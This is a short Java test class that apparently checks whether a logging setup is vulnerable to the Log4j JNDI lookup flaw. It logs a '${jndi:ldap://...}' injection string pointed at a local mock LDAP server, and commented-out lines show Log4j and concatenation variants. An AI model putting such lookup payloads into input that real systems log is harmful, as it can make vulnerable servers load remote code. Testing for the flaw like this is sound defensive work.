package com.tp.sample.log4jcve;

import org.slf4j.LoggerFactory;

public class Application {

  public static void main(String[] args) {
    var jndi = "${jndi:ldap://127.0.0.1:389/dc=ldapmock,dc=local}";
//    LogManager.getLogger(Application.class).info("Log4j Vulnerability {}", jndi);
//    LogManager.getLogger(Application.class).info("Log4j Vulnerability " + jndi);
    LoggerFactory.getLogger(Application.class).info("Slf4j Vulnerability {}", jndi);
//    LoggerFactory.getLogger(Application.class).info("Slf4j Vulnerability " + jndi);
  }
}
